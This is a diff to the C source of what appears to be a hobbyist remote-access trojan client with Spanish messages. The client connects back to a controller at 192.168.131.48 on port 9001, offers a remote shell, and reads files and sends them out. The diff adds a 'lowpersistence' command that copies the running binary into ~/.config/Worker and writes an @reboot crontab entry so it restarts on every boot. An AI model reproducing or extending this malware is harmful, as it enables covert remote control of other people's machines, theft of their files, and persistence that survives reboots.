@@ -10,6 +10,7 @@
 #include <stdbool.h>
 #include <libgen.h>
 #include <signal.h>
+#include <sys/stat.h>
 #include "../src/base64.c"
 #include "../src/sysInfoLin.c"
 
@@ -26,6 +27,7 @@ int readNdSndFle(int conn, char *file);
 void conection();
 void ash(int conn);
 void _chdir(int conn, char *instruct);
+char* copySource(int conn);
 
 
 int excndSend(int conn, char* cmd){
@@ -102,8 +104,7 @@ void _chdir(int conn, char *instruct) {
 void ash(int conn){
     char cmd[CMDBUFF] = "";
 
-    while (true)
-    {
+    while (true){
         recv(conn, cmd, sizeof(cmd), 0); 
         if (strcmp(cmd, "q") == 0){
             memset(cmd, 0, SOCKBUFF);
@@ -220,6 +221,7 @@ int readNdSndFle(int conn, char *file){
 
     if (ptr == NULL) {
         send(conn, "No se puede abrir el archivo.\n", strlen("No se puede abrir el archivo.\n"), 0);
+        sleep(0.3);
         send(conn, "end\0", strlen("end\0"), 0);
         return 1;
     }
@@ -246,6 +248,50 @@ int readNdSndFle(int conn, char *file){
     sleep(0.3);
     send(conn, "end\0", strlen("end\0"), 0); 
     printf("end");
+    return 0;
+}
+
+char* copySource(int conn){
+    char* home = getenv("HOME");
+    char* servicePath = "/.config/Worker";
+    char* lction = malloc(strlen(home) + strlen(servicePath) + 1);
+    strcpy(lction, home);
+    strcat(lction, servicePath);
+
+    struct stat buffer;
+    if (stat(lction, &buffer) != 0) {
+        mkdir(lction, 0700); 
+    }
+
+    strcat(lction, "/worker");
+
+    char path[255];
+    ssize_t count = readlink("/proc/self/exe", path, 255);
+    if (count == -1) {
+        send(conn, "error", strlen("error"), 0);
+    }
+
+    char command[255];
+    sprintf(command, "cp %s %s && chmod 755 %s", path, lction, lction);
+    printf("%s\n", command);
+    system(command);
+    
+    return lction;
+}
+
+int getLWPrstnc(int conn){
+    char* path = copySource(conn);
+    char* kwor = malloc(SOCKBUFF);
+    char* cmd = malloc(SOCKBUFF);
+
+    snprintf(kwor, SOCKBUFF, "@reboot %s\n", path);
+    snprintf(cmd, SOCKBUFF, "echo '%s' > /tmp/tmpajfeasc && crontab /tmp/tmpajfeasc &>/dev/null", kwor);
+
+    system(cmd); 
+
+    printf("\n\n%s", cmd);
+
+    send(conn, "exito", strlen("exito"), 0);
     return 0;
 }
 
@@ -279,6 +325,10 @@ int mainLoop(int conn){
             srtSysInfo(conn);
             send(conn, "end\0", strlen("end\0"), 0);
         
+        } else if (strcmp(instruct, "lowpersistence") == 0){
+            getLWPrstnc(conn);          
+            sleep(0.3);
+        
         } else
             continue;
     }
@@ -294,7 +344,7 @@ void conection(){
     
     cltAddr.sin_family = AF_INET;
     cltAddr.sin_port = htons(9001); // Especifcamos puerto 
-    cltAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    cltAddr.sin_addr.s_addr = inet_addr("192.168.131.48");
 
     int targetConnStatus 
         = connect(conn, (struct sockaddr*)&cltAddr, 
